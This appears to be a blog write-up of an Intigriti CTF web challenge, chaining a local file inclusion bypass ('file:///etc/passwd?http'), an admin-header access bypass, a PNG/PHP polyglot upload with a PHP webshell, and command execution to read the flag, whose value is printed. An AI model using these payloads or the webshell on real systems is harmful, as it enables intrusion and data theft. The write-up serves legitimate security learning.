---
date: 2025-11-05
title: 'Shoppix Fashion Importer CTF Walkthrough - LFI to Remote Code Execution'
template: post
slug: Shoppix-Fashion-Importer-CTF-Walkthrough
categories:
  - Technical
tags:
  - bug-bounty

---

What up, fellow hackers and CTF players! Today, I'm breaking down a fun challenge from Intigriti called "Shoppix Fashion Importer." This box was a classic web challenge that took us on a ride from a simple Local File Inclusion (LFI) all the way to Remote Code Execution (RCE) by bypassing a series of creative security measures. Let's dive into how it was done.

## Initial Analysis & LFI Discovery

The challenge presented a simple web app: an input field to fetch a URL and display its contents. Classic SSRF/LFI territory.

![Initial page of the Shoppix Fashion Importer challenge](https://github.com/user-attachments/assets/5bb0005b-5a7e-4e9d-8a98-fe354de9ac6f)

My first test was to see how the application handled local file paths. I tried `file:///etc/passwd`, but the server-side code had a basic validation check: the `url` parameter had to contain the substring `http`.

![HTTP validation error](https://github.com/user-attachments/assets/4562a38b-fc81-4782-ab46-fa76ae02ca7a)

This is a weak check and easily bypassed. By appending `?http` to the end of the local file path, the validation passes, but the server's file handler ignores the query string. The payload that worked was:

```
file:///etc/passwd?http
```

The application dutifully rendered the contents of `/etc/passwd`, confirming a Local File Inclusion (LFI) vulnerability.

![LFI successful showing /etc/passwd](https://github.com/user-attachments/assets/738c62e1-7ed6-4384-ab77-08beaf483c5c)

## Filesystem Enumeration via LFI

With LFI confirmed, it was time to explore the filesystem. I started by listing the root directory:

```
file:///?http
```

This revealed a standard Linux filesystem layout and, more importantly, a file with a UUID-like name in the root directory: `93e892fe-c0af-44a1-9308-5a58548abd98.txt`. This was almost certainly the flag file.

Next, I enumerated the webroot (`/var/www/html`) to see the application's source files:

```
file:///var/www/html?http
```

This revealed another interesting file: `upload_shoppix_images.php`. An upload functionality is a prime target for achieving RCE.

![LFI showing the webroot contents](https://github.com/user-attachments/assets/bc11ae74-d708-4731-8b0b-22d92ec1ff61)

## Bypassing the Upload Page

Directly navigating to `https://challenge-1025.intigriti.io/upload_shoppix_images.php` resulted in a `403 Forbidden` error. The page was protected.

![403 Forbidden error on the upload page](https://github.com/user-attachments/assets/53bb4468-4a8c-4511-95e3-c9c1f11e7b85)

To figure out why, I used the LFI vulnerability to read the Apache site configuration file at `/etc/apache2/sites-enabled/000-default.conf`:

```
file:///etc/apache2/sites-enabled/000-default.conf?http
```

Inside the config, I found the access control rule for the upload script:

```apache
<Files "upload_shoppix_images.php">
    <If "%{HTTP:is-shoppix-admin} != \'true\'">
        Require all denied
    </If>
    Require all granted
</Files>
```

The server was checking for a custom HTTP header, `Is-Shoppix-Admin`, and it had to be set to `true`. I added this header to my requests in Burp Suite, which granted me access to the upload page.

![Apache config revealing the custom header](https://github.com/user-attachments/assets/c2a69760-7021-44fe-b8e9-4824ec38f45b)

## Crafting the Webshell & Bypassing File Upload Validation

Now that I could access the upload page, I needed to bypass its file validation. I used the LFI again to read the source code of `upload_shoppix_images.php`:

```
file:///var/www/html/upload_shoppix_images.php?http
```

The script had two validation checks:
1.  The MIME type must start with `image/`.
2.  The filename must contain `.png`, `.jpg`, or `.jpeg`.

```php
<?php
if ($_SERVER["REQUEST_METHOD"] === "POST") {
    $file = $_FILES["image"];
    $filename = $file["name"];
    $tmp = $file["tmp_name"];
    $mime = mime_content_type($tmp);

    if (strpos($mime, "image/") === 0 && (stripos($filename, ".png") !== false || stripos($filename, ".jpg") !== false || stripos($filename, ".jpeg") !== false)) {
        move_uploaded_file($tmp, "uploads/" . basename($filename));
        echo "<p style='color:#00e676'>✅ File uploaded successfully to /uploads/ directory!</p>";
    } else {
        echo "<p style='color:#ff5252'>❌ Invalid file format</p>";
    }
}
?>
```

To bypass this, I created a polyglot file that was both a valid PNG and a PHP webshell.

1.  **The Content**: I used a tiny, valid 1x1 PNG file's content to satisfy the `image/` MIME type check. I then appended my PHP webshell code to it.

2.  **The Webshell**: A simple PHP script to execute commands passed via a `cmd` GET parameter.
    ```php
    <?php system($_GET['cmd']); ?>
    ```

3.  **The Filename**: I named the file `ibrahim_shell.png.php`. This filename contains `.png`, satisfying the filename check, but because it ends with `.php`, Apache will execute it as a PHP script.

I constructed the `multipart/form-data` request in Burp Repeater, added the `Is-Shoppix-Admin: true` header, and sent the request. The server responded with a success message.

![Successful file upload response](https://github.com/user-attachments/assets/66e6bbe0-9987-4771-925f-39dd714b50ae)

## Achieving RCE and Capturing the Flag

To find my uploaded shell, I used the LFI one last time to list the contents of the `uploads/` directory:

```
file:///var/www/html/uploads/?http
```

My shell, `ibrahim_shell.png.php`, was there as expected.

![LFI showing the uploaded shell in the uploads directory](https://github.com/user-attachments/assets/5dee3083-c78a-4c52-9a9d-e4a5cb16146f)

Now I could access the shell directly and execute commands. I started by running `ls -la /` to confirm RCE:

```
https://challenge-1025.intigriti.io/uploads/ibrahim_shell.png.php?cmd=ls%20-la%20/
```

![RCE confirmed by listing the root directory](https://github.com/user-attachments/assets/182c6139-7156-4fe2-bd75-f1729cb8652b)

With RCE confirmed, the final step was to read the flag file I discovered earlier.

```
https://challenge-1025.intigriti.io/uploads/ibrahim_shell.png.php?cmd=cat%20/93e892fe-c0af-44a1-9308-5a58548abd98.txt
```

The server responded with the flag: `INTIGRITI{ngks896sdjvsjnv6383utbgn}`.

![The flag is revealed](https://github.com/user-attachments/assets/e72b06b4-b832-4822-9732-1420f3ac8729)

## Conclusion

This was a fantastic and well-structured CTF challenge. It demonstrated a realistic chain of vulnerabilities:

*   A weak input validation leading to **LFI**.
*   Using LFI for **information disclosure** to understand the application and server configuration.
*   Bypassing a custom **access control** mechanism.
*   Exploiting a file upload functionality with weak validation to achieve **RCE**.

It's a great reminder to always test for LFI and to never underestimate how far a single vulnerability can take you. Happy hacking!
